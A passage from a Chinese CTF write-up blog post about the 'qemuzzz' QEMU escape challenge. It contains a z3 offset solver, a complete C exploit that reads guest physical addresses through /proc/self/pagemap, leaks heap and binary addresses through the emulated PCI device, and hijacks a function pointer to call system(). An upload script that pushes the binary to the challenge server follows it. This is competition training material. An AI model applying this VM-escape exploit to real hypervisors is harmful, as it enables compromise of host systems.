+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">solver = Solver()</span><br><span class="line"></span><br><span class="line">a = BitVec(<span class="string">'a'</span>, <span class="number">24</span>)</span><br><span class="line">b = BitVec(<span class="string">'b'</span>, <span class="number">24</span>)</span><br><span class="line">solver.add(a&lt;<span class="number">0x1000</span>)</span><br><span class="line">solver.add(b&lt;<span class="number">0x1000</span>)</span><br><span class="line"></span><br><span class="line">solver.add(a + b&amp;<span class="number">0x7ffe</span> == <span class="number">0x1000</span>)                <span class="comment">#0x1000可以浮动</span></span><br><span class="line">solver.add(a^<span class="number">0x209</span> + ((b^<span class="number">0x209</span>)&amp;<span class="number">0x7ffe</span>) == <span class="number">0xffe</span>) <span class="comment">#0xffe可以浮动</span></span><br><span class="line"></span><br><span class="line">solver.check()</span><br><span class="line">print(solver.model())</span><br></pre></td></tr></table></figure>
+<p>解出<code>2575</code>和<code>1521</code>两个数，之后就重新构造偏移再填入函数指针(<code>system</code>地址)和设备控制块基址(需要<code>*(_QWORD *)(v3 + 0x9E0) &amp; 0xFFF) == 0</code>且<code>*(_QWORD *)(v3 + 0x9E0) == /bin/sh的地址</code>，最后触发即可。</p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;assert.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;fcntl.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;inttypes.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;string.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/mman.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;unistd.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/io.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#define PAGE_SHIFT  12</span></span><br><span class="line"><span class="comment">#define PAGE_SIZE   (1 &lt;&lt; PAGE_SHIFT)</span></span><br><span class="line"><span class="comment">#define PFN_PRESENT (1ull &lt;&lt; 63)</span></span><br><span class="line"><span class="comment">#define PFN_PFN     ((1ull &lt;&lt; 55) - 1)</span></span><br><span class="line"></span><br><span class="line">int fd;</span><br><span class="line">unsigned char* mmio_mem;</span><br><span class="line">void perr(char str[])&#123;</span><br><span class="line">    puts(str);</span><br><span class="line">    exit(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void mmio_write(uint32_t addr, uint32_t value)</span><br><span class="line">&#123;</span><br><span class="line">    *((uint32_t*)(mmio_mem + addr)) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">uint8_t mmio_read(uint64_t addr)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> *((uint8_t*)(mmio_mem + addr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">uint32_t page_offset(uint32_t addr)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> addr &amp; ((<span class="number">1</span> &lt;&lt; PAGE_SHIFT) - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">uint64_t gva_to_gfn(void *addr)</span><br><span class="line">&#123;</span><br><span class="line">    uint64_t pme, gfn;</span><br><span class="line">    size_t offset;</span><br><span class="line">    offset = ((uintptr_t)addr &gt;&gt; <span class="number">9</span>) &amp; ~<span class="number">7</span>;</span><br><span class="line">    lseek(fd, offset, SEEK_SET);</span><br><span class="line">    read(fd, &amp;pme, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span> (!(pme &amp; PFN_PRESENT))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    gfn = pme &amp; PFN_PFN;</span><br><span class="line">    <span class="keyword">return</span> gfn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">uint64_t gva_to_gpa(void *addr)</span><br><span class="line">&#123;</span><br><span class="line">    uint64_t gfn = gva_to_gfn(addr);</span><br><span class="line">    <span class="keyword">assert</span>(gfn != <span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">return</span> (gfn &lt;&lt; PAGE_SHIFT) | page_offset((uint64_t)addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    int mmio_fd = open(<span class="string">"/sys/devices/pci0000:00/0000:00:04.0/resource0"</span>, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span> (mmio_fd == <span class="number">-1</span>)</span><br><span class="line">        perr(<span class="string">"[:(]mmio_fd open failed..."</span>);</span><br><span class="line"></span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x100000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (mmio_mem == MAP_FAILED)</span><br><span class="line">        perr(<span class="string">"[:(]mmap mmio_mem failed..."</span>);</span><br><span class="line"></span><br><span class="line">    printf(<span class="string">"[:)]mmio_mem = %p\n"</span>, mmio_mem);</span><br><span class="line"></span><br><span class="line">    fd = open(<span class="string">"/proc/self/pagemap"</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">"open"</span>);</span><br><span class="line">        exit(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    uint8_t *ptr0,*ptr1,*ptr2,*ptr3;</span><br><span class="line">    uint64_t ptr0_mem,ptr1_mem,ptr2_mem,ptr3_mem;</span><br><span class="line"></span><br><span class="line">    ptr1 = malloc(<span class="number">0xff0</span>);</span><br><span class="line">    ptr2 = malloc(<span class="number">0x900</span>);</span><br><span class="line">    ptr3 = malloc(<span class="number">0x700</span>);</span><br><span class="line">    memset(ptr1,<span class="string">'A'</span>,<span class="number">0xff0</span>);</span><br><span class="line">    memset(ptr2,<span class="string">'B'</span>,<span class="number">0x900</span>);</span><br><span class="line">    memset(ptr3,<span class="string">'C'</span>,<span class="number">0x700</span>);</span><br><span class="line">    ptr1_mem = gva_to_gpa(ptr1);</span><br><span class="line">    ptr2_mem = gva_to_gpa(ptr2);</span><br><span class="line">    ptr3_mem = gva_to_gpa(ptr3);</span><br><span class="line">    printf(<span class="string">"Your physical address is at %p\n"</span>, ptr1_mem);</span><br><span class="line">    printf(<span class="string">"Your physical address is at %p\n"</span>, ptr2_mem);</span><br><span class="line">    printf(<span class="string">"Your physical address is at %p\n"</span>, ptr3_mem);</span><br><span class="line"></span><br><span class="line">    mmio_write(<span class="number">0x20</span>,ptr2_mem&gt;&gt;<span class="number">12</span>);</span><br><span class="line">    mmio_write(<span class="number">0x10</span>,<span class="number">0x1</span>);</span><br><span class="line">    mmio_write(<span class="number">0x18</span>,<span class="number">0x1001</span>);</span><br><span class="line">    mmio_write(<span class="number">0x60</span>,<span class="number">0xdead</span>);</span><br><span class="line"></span><br><span class="line">    getchar();</span><br><span class="line">    uint8_t key = *(uint8_t*)(ptr3+<span class="number">0x6ff</span>);</span><br><span class="line">    printf(<span class="string">"key = %p\n"</span>,key);</span><br><span class="line"></span><br><span class="line">    *(uint64_t*)ptr2 = ptr2_mem&gt;&gt;<span class="number">8</span>;</span><br><span class="line">    *(uint16_t*)(ptr2+<span class="number">0x7</span>) = <span class="number">1521</span>;</span><br><span class="line">    *(uint16_t*)(ptr2+<span class="number">0x9</span>) = <span class="number">2575</span>;</span><br><span class="line">    *(uint8_t*)(ptr3+<span class="number">0x6ff</span>) = key+<span class="number">0x10</span>;</span><br><span class="line">    mmio_write(<span class="number">0x20</span>,ptr2_mem&gt;&gt;<span class="number">12</span>);</span><br><span class="line">    mmio_write(<span class="number">0x10</span>,<span class="number">1</span>);</span><br><span class="line">    mmio_write(<span class="number">0x18</span>,<span class="number">0x1000</span>);</span><br><span class="line">    mmio_write(<span class="number">0x60</span>,<span class="number">0xdead</span>);</span><br><span class="line">    getchar();</span><br><span class="line">    mmio_write(<span class="number">0x60</span>,<span class="number">0xcafe</span>);</span><br><span class="line">    getchar();</span><br><span class="line"></span><br><span class="line">    uint64_t heap = *(uint64_t*)(ptr2+<span class="number">0x5e1</span>);</span><br><span class="line">    uint64_t cpu_physical_memory_rw = *(uint64_t*)(ptr2+<span class="number">0x5e9</span>);</span><br><span class="line">    printf(<span class="string">"heap = %p\n"</span>,heap+<span class="number">0x9f0</span>);</span><br><span class="line">    printf(<span class="string">"heap1 = %p\n"</span>,heap+<span class="number">0x9f0</span>+<span class="number">0x806</span>);</span><br><span class="line">    printf(<span class="string">"heap2 = %p\n"</span>,heap+<span class="number">0x9f0</span>+<span class="number">0x7f8</span>);</span><br><span class="line">    printf(<span class="string">"cpu_physical_memory_rw = %p\n"</span>,cpu_physical_memory_rw);</span><br><span class="line">    uint64_t elfbase = cpu_physical_memory_rw - <span class="number">0x5BC5C0</span>;</span><br><span class="line">    printf(<span class="string">"elfbase = %p\n"</span>,elfbase);</span><br><span class="line">    uint64_t system = elfbase + <span class="number">0x2A7A80</span>;</span><br><span class="line"></span><br><span class="line">    mmio_write(<span class="number">0x10</span>,<span class="number">8</span>);</span><br><span class="line">    mmio_write(<span class="number">0x18</span>,<span class="number">22</span>);</span><br><span class="line">    mmio_write(<span class="number">0x50</span>,<span class="number">0xaaaa</span>);</span><br><span class="line"></span><br><span class="line">    uint64_t sh_addr = <span class="number">0x1000</span>+((heap+<span class="number">0x9f0</span>+<span class="number">0x806</span>)&amp;<span class="number">0xfffffffff000</span>);</span><br><span class="line">    uint64_t padding_size = <span class="number">0x1000</span><span class="number">-0x986</span>;</span><br><span class="line">    strcpy(ptr2+padding_size,<span class="string">"cat flag"</span>);</span><br><span class="line">    *(uint64_t*)(ptr2+padding_size+<span class="number">0x10</span>) = sh_addr;</span><br><span class="line">    *(uint64_t*)(ptr2+<span class="number">0x7f0</span><span class="number">-6</span>) = <span class="number">0x1010</span>+((heap+<span class="number">0x9f0</span>+<span class="number">0x806</span>)&amp;<span class="number">0xfffffffff000</span>)<span class="number">-0x9E0</span>;</span><br><span class="line">    *(uint64_t*)(ptr2+<span class="number">0x7f8</span><span class="number">-6</span>) = system;</span><br><span class="line">    getchar();</span><br><span class="line">    mmio_write(<span class="number">0x60</span>,<span class="number">0xcaff</span>);</span><br><span class="line">    </span><br><span class="line">    getchar();</span><br><span class="line">    mmio_write(<span class="number">0x60</span>,<span class="number">0xcb00</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">musl-gcc myexp_remote.c -Os -static -o myexp_remote</span><br><span class="line">strip myexp_remote</span><br><span class="line">python upload.py</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> commands</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exec_cmd</span><span class="params">(cmd)</span>:</span></span><br><span class="line">    r.sendline(cmd)</span><br><span class="line">    r.recvuntil(<span class="string">"# "</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload</span><span class="params">()</span>:</span></span><br><span class="line">    p = log.progress(<span class="string">"Upload"</span>)</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">"myexp_remote"</span>,<span class="string">"rb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line">        </span><br><span class="line">    encoded = base64.b64encode(data)</span><br><span class="line">    r.recvuntil(<span class="string">"# "</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(encoded),<span class="number">1000</span>):</span><br><span class="line">        p.status(<span class="string">"%d / %d"</span> % (i,len(encoded)))</span><br><span class="line">        exec_cmd(<span class="string">"echo \"%s\" &gt;&gt; benc"</span> % (encoded[i:i+<span class="number">1000</span>]))</span><br><span class="line">        </span><br><span class="line">    exec_cmd(<span class="string">"cat ./benc | base64 -d &gt; ./bout"</span>)</span><br><span class="line">    exec_cmd(<span class="string">"chmod +x ./bout"</span>)</span><br><span class="line">    log.success(<span class="string">"success"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">(r)</span>:</span></span><br><span class="line">    upload()</span><br><span class="line">    r.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    r = remote(<span class="string">'124.70.28.14'</span>,<span class="number">9999</span>)</span><br><span class="line">    r.recvuntil(<span class="string">'MYOS login: '</span>)</span><br><span class="line">    r.sendline(<span class="string">'root'</span>)</span><br><span class="line">    exploit(r)</span><br></pre></td></tr></table></figure>
+<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>此题逆向难度较小，利用难度中规中矩带且有一点创新，但是可能需要对物理地址的寻找方法比较熟练才能比较快的解出，不熟悉可能在调试时会遇到一些小麻烦，总体来说出的比较好，很适合只有一天时间的比赛。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>打赏还是打残，这是个问题</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>打赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/weichat.png" alt=" 微信支付">
+        <p>微信支付</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/alipay.jpg" alt=" 支付宝">
+        <p>支付宝</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://xiaoxiaorenwu.top/2020/12/24/XCTF高校网络安全专题挑战赛_华为云专场_qemuzzz解题过程分析/" title="XCTF高校网络安全专题挑战赛_华为云专场_qemuzzz解题过程分析">https://xiaoxiaorenwu.top/2020/12/24/XCTF高校网络安全专题挑战赛_华为云专场_qemuzzz解题过程分析/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Qemu逃逸/" rel="tag"><i class="fa fa-tag"></i> Qemu逃逸</a>
+          
+            <a href="/tags/RealWorld/" rel="tag"><i class="fa fa-tag"></i> RealWorld</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/10/10/KVM学习—利用KVM实现一个简易的Hypervisor/" rel="next" title="KVM学习-如何利用kvm写一个自己的Hypervisor">
+                <i class="fa fa-chevron-left"></i> KVM学习-如何利用kvm写一个自己的Hypervisor
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2021/01/03/Qemu学习—Qemu与KVM启动流程浅析/" rel="prev" title="Qemu学习-Qemu与KVM启动流程分析">
+                Qemu学习-Qemu与KVM启动流程分析 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+    </div>
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/xxrw.jpg" alt="">
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description">Babypwner@Dubhe@BUPT</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">53</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">9</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">24</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/xiaoxiaorenwu" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:renwuxiaoxiao@126.com" target="_blank" title="E-mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                大佬们的blog~~
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://p4nda.top" title="p4nda" target="_blank">p4nda</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://sunichi.github.io/" title="sunichi" target="_blank">sunichi</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://e3pem.github.io/" title="e3pem" target="_blank">e3pem</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://p1umer.github.io/" title="P1umer" target="_blank">P1umer</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://hpasserby.me/" title="hpasserby" target="_blank">hpasserby</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://ama2in9.top/" title="ama2in9" target="_blank">ama2in9</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://t3ls.club/" title="T3LS" target="_blank">T3LS</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.pwn4fun.com/" title="Railgun" target="_blank">Railgun</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#qemuzzz"><span class="nav-number">1.</span> <span class="nav-text">qemuzzz</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#解题过程"><span class="nav-number">1.2.</span> <span class="nav-text">解题过程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#逆向，函数功能分析"><span class="nav-number">1.2.1.</span> <span class="nav-text">逆向，函数功能分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞分析"><span class="nav-number">1.2.2.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用"><span class="nav-number">1.2.3.</span> <span class="nav-text">利用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#leak"><span class="nav-number">1.2.3.1.</span> <span class="nav-text">leak</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#hijack"><span class="nav-number">1.2.3.2.</span> <span class="nav-text">hijack</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp"><span class="nav-number">1.2.4.</span> <span class="nav-text">exp</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#upload"><span class="nav-number">1.2.5.</span> <span class="nav-text">upload</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#结语"><span class="nav-number">1.3.</span> <span class="nav-text">结语</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder"></span>
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+  </script>
+  
+    <span class="site-uv">
+      访客数
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      人
+    </span>
+  
+
+  
+    <span class="site-pv">
+      总访问量
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      次
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+  
+  <script type="text/javascript">
+    var GUEST = ['nick','mail','link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item=>{
+      return GUEST.indexOf(item)>-1;
+    });
+    new Valine({
+        el: '#comments' ,
+        verify: false,
+        notify: false,
+        appId: 'wQR3fxNYiFB3Sh2MdPvjK8ez-gzGzoHsz',
+        appKey: 'M81KRpr3NUHCSrwBJ9TY73HF',
+        placeholder: '欢乐时光就要开始了',
